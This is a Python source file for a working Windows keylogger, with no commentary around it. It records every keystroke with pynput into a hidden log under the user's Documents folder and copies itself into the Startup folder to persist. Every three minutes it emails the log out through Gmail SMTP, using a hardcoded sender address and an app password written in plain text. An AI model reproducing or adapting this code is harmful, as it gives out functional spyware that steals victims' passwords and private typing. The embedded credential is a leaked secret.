

import os
import sys
import shutil
import smtplib
import threading
import time
from pynput import keyboard
from datetime import datetime
from email.message import EmailMessage


def add_to_startup():
    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    current_script = os.path.realpath(sys.argv[0])
    target_script = os.path.join(startup_path, os.path.basename(current_script))
    if current_script != target_script:
        try:
            shutil.copy(current_script, target_script)
            print("copied")
        except Exception as e:
            print(f"Failed {e}")




documents_path = os.path.join(os.path.expanduser("~"), "Documents")
log_folder = os.path.join(documents_path, "cache")
os.makedirs(log_folder, exist_ok=True)
filename = os.path.join(log_folder, "keystrokes_log.txt")  


sender_email = "logerkey28@gmail.com"          
receiver_email = "logerkey28@gmail.com"    
app_password = "nwfvsvxhxdvzykgn" 


def send_email_log(file_path, sender_email, receiver_email, app_password):
    try:
        msg = EmailMessage()
        msg['Subject'] = 'Keylogger Report'
        msg['From'] = sender_email
        msg['To'] = receiver_email
        msg.set_content("Attached is the keystroke log file.")

        with open(file_path, 'rb') as f:
            file_data = f.read()
            file_name = os.path.basename(file_path)

        msg.add_attachment(file_data, maintype='text', subtype='plain', filename=file_name)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(sender_email, app_password)
            smtp.send_message(msg)
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Email sent successfully.")

    except Exception as e:
        print(f"Failed to send email: {e}")


pressed_keys = set()

def on_press(key):
    pressed_keys.add(key)
    try:
        with open(filename, "a", encoding="utf-8") as f:
            f.write(key.char)
    except AttributeError:
        with open(filename, "a", encoding="utf-8") as f:
            f.write(f" [{key}] ")

def on_release(key):
    pressed_keys.discard(key)
    
    if (keyboard.Key.ctrl_l in pressed_keys or keyboard.Key.ctrl_r in pressed_keys) and key == keyboard.Key.enter:
        print("Ctrl+Enter pressed. Stopping keylogger.")
        return False


def send_email_periodically():
    while True:
        time.sleep(180)  
        send_email_log(filename, sender_email, receiver_email, app_password)


if __name__ == "__main__":
    add_to_startup()
    email_thread = threading.Thread(target=send_email_periodically, daemon=True)
    email_thread.start()

    
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
